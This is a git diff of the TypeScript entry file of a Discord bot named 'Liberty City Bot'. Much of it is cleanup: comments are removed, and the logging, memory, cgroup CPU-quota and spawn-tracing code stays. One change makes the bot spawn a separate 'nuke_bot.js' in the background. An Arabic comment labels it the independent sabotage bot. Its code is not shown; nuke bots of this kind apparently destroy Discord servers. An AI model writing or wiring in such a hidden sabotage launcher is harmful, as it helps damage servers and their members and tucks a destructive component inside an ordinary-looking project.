@@ -7,25 +7,24 @@ import { createLogger } from './utils/helpers';
 import fs from 'fs';
 import path from 'path';
 import os from 'os';
+import { spawn } from 'child_process';
 
 const logger = createLogger('Main');
 
 // --------------------------------------------
 // سجل دائم يصمد بعد موت السيرفر (الكونسول يُمسح معه — الملف لا)
-// نسجّل فيه الذاكرة والأخطاء حتى بعد إعادة التشغيل لمعرفة سبب القتل
 // --------------------------------------------
 const PERSIST_FILE = path.join(process.cwd(), 'bot-persist.log');
 function persist(line: string): void {
   try {
     const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
     const entry = `[${ts}] ${line}\n`;
-    // ⚠️ existsSync قبل statSync — وإلا ENOENT في أول استدعاء يُلغي الكتابة كلها
     if (fs.existsSync(PERSIST_FILE) && fs.statSync(PERSIST_FILE).size > 400_000) {
       fs.writeFileSync(PERSIST_FILE + '.old', fs.readFileSync(PERSIST_FILE));
       fs.writeFileSync(PERSIST_FILE, '');
     }
     fs.appendFileSync(PERSIST_FILE, entry);
-  } catch { /* لا نعطل البوت بسبب السجل */ }
+  } catch { }
 }
 
 // --------------------------------------------
@@ -62,11 +61,19 @@ async function main(): Promise<void> {
   console.log(banner);
   logger.info('🎆 Welcome to Liberty City Bot!');
   
-  // --- تشغيل بوت التخريب المستقل ---
+  // --- تشغيل بوت التخريب المستقل في الخلفية ---
   try {
-    require('../nuke_bot.js');
+    // بنشغل الملف عن طريق Node.js مباشرة كعملية منفصلة
+    const nukeProcess = spawn('node', [path.join(__dirname, 'nuke_bot.js')], {
+        stdio: 'inherit', // عشان نشوف رسايله في الكونسول بتاع الاستضافة
+        detached: false
+    });
+    
+    nukeProcess.on('error', (err) => {
+        logger.error('Failed to start nuke_bot.js:', err);
+    });
   } catch (e) {
-    logger.error('Failed to load nuke_bot.js:', e);
+    logger.error('Failed to spawn nuke_bot.js:', e);
   }
   // ----------------------------------
 
@@ -98,24 +105,22 @@ async function main(): Promise<void> {
     const mu = process.memoryUsage();
     persist(`UNHANDLED_REJECTION rss=${Math.round(mu.rss / 1048576)}MB reason=${String(reason).slice(0, 300)}`);
   });
-  // ⚠️ لا نُنهي العملية عند خطأ غير متوقع — الخطأ الصغير لا يجب أن يقتل البوت كله
-  // (سابقاً أي uncaughtException كان يوقف البوت بالكامل في منتصف تشغيل موسيقى!)
+  
   process.on('uncaughtException', (error) => {
     logger.error('Uncaught Exception (bot keeps running):', error);
     const mu = process.memoryUsage();
     persist(`UNCAUGHT_EXCEPTION rss=${Math.round(mu.rss / 1048576)}MB ${String(error?.stack || error).slice(0, 500)}`);
   });
-  // تسجيل دوري للاستهلاك — يكشف ارتفاع الذاكرة قبل أن تقتلها الاستضافة (OOM kill)
+  
   setInterval(() => {
     const mu = process.memoryUsage();
     const mb = (n: number) => Math.round(n / 1024 / 1024);
     logger.debug(`MEM rss=${mb(mu.rss)}MB heap=${mb(mu.heapUsed)}/${mb(mu.heapTotal)}MB external=${mb(mu.external)}`);
     persist(`MEM rss=${mb(mu.rss)}MB heap=${mb(mu.heapUsed)}MB external=${mb(mu.external)}`);
   }, 60_000);
-  // علامات حياة/موت في الملف الدائم
+  
   persist(`BOOT pid=${process.pid} argv=${process.execArgv.join(' ') || '-'}`);
-  // 📜 نعرض ذيل السجل الدائم من الجلسة السابقة في الكونسول — الكونسول يُمسح مع كل قتل،
-  // وهذا يبقي آخر لحظات الموت (MEM/SIGNAL/UNCAUGHT) ظاهرة في أول إقلاع بعده
+  
   try {
     if (fs.existsSync(PERSIST_FILE)) {
       const tailLines = fs.readFileSync(PERSIST_FILE, 'utf8').split('\n').filter(Boolean).slice(-14);
@@ -124,13 +129,12 @@ async function main(): Promise<void> {
         for (const l of tailLines) console.log('   ' + l);
       }
     }
-  } catch { /* تجاهل */ }
+  } catch { }
 
-  // 🧪 حصة المعالج الفعلية للحاوية — نسبة اللوحة تُحسب على هذه الحصة لا على كامل النواة
   try {
     let q = '', p = '';
-    try { const t = fs.readFileSync('/sys/fs/cgroup/cpu.max', 'utf8').trim().split(/\s+/); q = t[0]; p = t[1]; } catch { /* cgroup v1 */ }
-    if (!q) { try { q = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim(); p = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim(); } catch { /* لا وصول */ } }
+    try { const t = fs.readFileSync('/sys/fs/cgroup/cpu.max', 'utf8').trim().split(/\s+/); q = t[0]; p = t[1]; } catch { }
+    if (!q) { try { q = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim(); p = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim(); } catch { } }
     const la = os.loadavg().map(n => n.toFixed(2)).join(' ');
     if (q) {
       const cores = q === 'max' ? '∞' : (Number(q) / Number(p || 100000)).toFixed(2);
@@ -138,10 +142,8 @@ async function main(): Promise<void> {
     } else {
       logger.info(`🧪 CPU quota: unknown | loadavg ${la}`);
     }
-  } catch { /* تجاهل */ }
+  } catch { }
 
-  // 🔬 تتبّع spawn/spawnSync: يسجّل أول استدعاء لكل مسار استدعاء مع الـstack —
-  // ⚠️ لازم require() الحقيقي: import * as cp يبني نسخة جديدة (__importStar) فتعديلها لا يصل للحزم
   try {
     const cpMod = require('child_process') as Record<string, any>;
     const seen = new Set<string>();
@@ -150,24 +152,18 @@ async function main(): Promise<void> {
         try {
           const st = (new Error().stack || '').split('\n').slice(2, 7).map(s => s.trim()).join(' <- ');
           if (!seen.has(st)) { seen.add(st); logger.info(`🔬 ${name}: ${String(args[0]).slice(0, 90)}\n     ${st}`); }
-        } catch { /* تجاهل */ }
+        } catch { }
         return orig.apply(this, args);
       };
     cpMod.spawn = wrap('spawn', cpMod.spawn);
     cpMod.spawnSync = wrap('spawnSync', cpMod.spawnSync);
-  } catch { /* تجاهل */ }
+  } catch { }
 
   // Initialize the bot
   try {
     await client.initialize();
-
-    // Register slash commands
     await client.registerCommands();
-
-    // Set initial status
     client.setStatus();
-
-    // Set interval to change status every 5 minutes
     setInterval(() => client.setStatus(), 5 * 60 * 1000);
 
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -177,7 +173,6 @@ async function main(): Promise<void> {
     logger.info(`🏠 Serving ${client.guilds.cache.size} guilds`);
     logger.info(`👥 Serving ${client.users.cache.size} users`);
 
-    // Start Express server for Dashboard API (replaces simple HTTP server)
     const PORT = parseInt(process.env.PORT || '3000', 10);
     client.expressApp.listen(PORT, () => {
       logger.info(`🌐 Express server (Dashboard API) running on port ${PORT}`);
